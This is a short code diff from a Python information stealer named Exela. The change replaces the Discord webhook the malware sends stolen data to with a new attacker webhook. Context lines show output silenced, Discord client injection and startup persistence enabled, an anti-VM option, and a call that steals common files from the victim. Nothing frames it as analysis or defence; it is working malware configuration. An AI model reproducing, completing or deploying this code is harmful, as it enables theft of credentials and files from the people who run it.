@@ -14,7 +14,7 @@ import time
 
 sys.stdout = open(os.devnull, 'w')
 
-webhook = 'https://discordapp.com/api/webhooks/1268854626288140372/Jp_jALGydP2E3ZGckb3FOVzc9ZhkJqKxsKzHVegnO-OIAwAWymr6lsbjCK0DAP_ttRV2'
+webhook = 'https://discord.com/api/webhooks/1355704235307569262/OgeBUlMkJ2Ram-T-R1n-ShhdLUSZtYweXDiA1X--NhXu_HQjIJxQLEf1-1S4zRpbIUcR'
 discord_injection = bool(True)
 startup_method = "folder".lower()
 Anti_VM = bool(False)
@@ -2497,4 +2497,5 @@ if __name__ == '__main__':
                 asyncio.run(StealCommonFiles().StealFiles())
             print(f"\nThe code executed on: {str(time.time() - start_time)} second", end="")
     else:
+
       print("just Windows Operating system's supported by Exela")
